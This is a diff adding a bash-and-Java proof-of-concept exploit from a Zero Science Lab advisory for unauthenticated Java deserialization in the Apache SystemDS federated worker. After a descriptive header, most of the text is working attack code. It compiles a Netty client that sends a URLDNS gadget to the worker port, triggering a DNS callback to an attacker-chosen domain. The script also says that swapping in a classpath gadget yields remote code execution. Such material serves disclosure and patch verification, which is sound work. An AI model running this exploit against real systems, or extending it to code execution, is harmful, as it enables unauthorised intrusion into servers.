@@ -1,0 +1,120 @@
+#!/usr/bin/env bash
+#
+#
+# Apache SystemDS 3.4.0 Unauthenticated Java Deserialization
+#
+#
+# Vendor: The Apache Software Foundation
+# Product web page: https://systemds.apache.org
+# Affected version: 3.4.0 and 3.5.0-SNAPSHOT
+#
+# Summary: SystemDS is an open source ML system for the end-to-end data science lifecycle
+# from data integration, cleaning, and feature engineering, over efficient, local and distributed
+# ML model training, to deployment and serving. To this end, it provides a stack of declarative
+# languages with R-like syntax for (1) the different tasks of the data-science lifecycle,
+# and (2) users with different expertise. These high-level scripts are compiled into hybrid
+# execution plans of local, in-memory CPU and GPU operations, as well as distributed operations
+# on Apache Spark.
+#
+# Desc: Apache SystemDS suffer from an unauthenticated Java deserialization vulnerability
+# in its federated worker. The federated worker (started with systemds -w) accepts objects
+# over a Netty channel using ObjectDecoder with no deserialization filtering and no authentication.
+# A remote attacker who can reach the worker port can send a serialized object that is
+# deserialized with no class restriction. This results in unauthenticated remote code execution
+# when a suitable gadget class is present on the federated worker's classpath.
+#
+#
+# Tested on: Microsoft Windows 10
+#            OpenJDK Temurin 21.0.6
+#            Netty 4.1.96
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+# Macedonian Information Security Research & Development Laboratory
+# Zero Science Lab - https://www.zeroscience.mk - @zeroscience
+#
+#
+# Advisory ID: ZSL-2026-6024
+# Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6024
+#
+#
+# 13.08.2026
+#
+
+
+set -u
+HOST="${1:-127.0.0.1}"; PORT="${2:-4001}"; DNS="${3:-systemds-deser.example.test}"
+case "$(uname -s)" in MINGW*|MSYS*|CYGWIN*) SEP=";"; jp(){ cygpath -w "$1"; } ;; *) SEP=":"; jp(){ printf '%s' "$1"; } ;; esac
+command -v javac >/dev/null || { echo "[!] need a JDK (javac)"; exit 1; }
+W="$(pwd)/systemds_trigger_build"; rm -rf "$W"; mkdir -p "$W/libs"
+
+V="4.1.96.Final"
+echo "[*] Fetching Netty $V modules (common/buffer/resolver/transport/codec) ..."
+for m in netty-common netty-buffer netty-resolver netty-transport netty-codec; do
+  curl -fsSL "https://repo1.maven.org/maven2/io/netty/$m/$V/$m-$V.jar" -o "$W/libs/$m-$V.jar" \
+    || { echo "[!] Download failed: $m-$V.jar"; exit 1; }
+done
+CP=""; for j in "$W"/libs/*.jar; do CP="${CP:+$CP$SEP}$(jp "$j")"; done
+
+cat > "$W/SystemdsFederatedSender.java" <<'EOF'
+import io.netty.bootstrap.Bootstrap;
+import io.netty.channel.*;
+import io.netty.channel.nio.NioEventLoopGroup;
+import io.netty.channel.socket.SocketChannel;
+import io.netty.channel.socket.nio.NioSocketChannel;
+import io.netty.handler.codec.serialization.ObjectEncoder;
+import java.lang.reflect.Field;
+import java.net.*;
+import java.util.HashMap;
+import java.util.concurrent.TimeUnit;
+
+public class SystemdsFederatedSender {
+    static Object urldns(String domain) throws Exception {
+        URLStreamHandler silent = new URLStreamHandler() {
+            protected URLConnection openConnection(URL u) { return null; }
+            protected synchronized InetAddress getHostAddress(URL u) { return null; }
+        };
+        HashMap<URL, String> ht = new HashMap<>();
+        URL u = new URL("http", domain, 80, "/", silent);
+        ht.put(u, domain);
+        Field f = URL.class.getDeclaredField("hashCode");
+        f.setAccessible(true); f.setInt(u, -1);
+        return ht;
+    }
+
+    public static void main(String[] args) throws Exception {
+        String host = args.length > 0 ? args[0] : "127.0.0.1";
+        int    port = args.length > 1 ? Integer.parseInt(args[1]) : 4001;
+        String dns  = args.length > 2 ? args[2] : "systemds-deser.example.test";
+        Object payload = urldns(dns);
+
+        EventLoopGroup g = new NioEventLoopGroup(1);
+        try {
+            Bootstrap b = new Bootstrap();
+            b.group(g).channel(NioSocketChannel.class).handler(new ChannelInitializer<SocketChannel>() {
+                protected void initChannel(SocketChannel ch) { ch.pipeline().addLast(new ObjectEncoder()); }
+            });
+            Channel ch = b.connect(host, port).sync().channel();
+            System.out.println("[+] connected to SystemDS federated worker " + host + ":" + port);
+            ch.writeAndFlush(payload).sync();
+            System.out.println("[+] Sent URLDNS object via the real Netty ObjectEncoder (compact serialization).");
+            System.out.println("    the worker's unfiltered ObjectDecoder.readObject() runs it PRE-AUTH ->");
+            System.out.println("    DNS lookup for '" + dns + "' fires FROM the worker host. Watch your DNS listener.");
+            System.out.println("    (For RCE: replace urldns() with a gadget object present on the worker classpath.)");
+            ch.closeFuture().await(3000, TimeUnit.MILLISECONDS);
+        } finally {
+            g.shutdownGracefully();
+        }
+    }
+}
+EOF
+
+echo "[*] Compiling the Netty sender ..."
+javac -cp "$CP" -d "$(jp "$W")" "$(jp "$W/SystemdsFederatedSender.java")" \
+  2> "$W/build.log" || { echo "[!] build failed:"; cat "$W/build.log"; exit 1; }
+
+echo "[*] Firing at the live worker ($HOST:$PORT), DNS callback domain: $DNS"
+echo "-----------------------------------------------------------------"
+java --add-opens java.base/java.net=ALL-UNNAMED -cp "$(jp "$W")${SEP}$CP" SystemdsFederatedSender "$HOST" "$PORT" "$DNS"
+echo "-----------------------------------------------------------------"
+echo "[*] A DNS hit for $DNS = unauthenticated deserialization confirmed on the SystemDS worker."
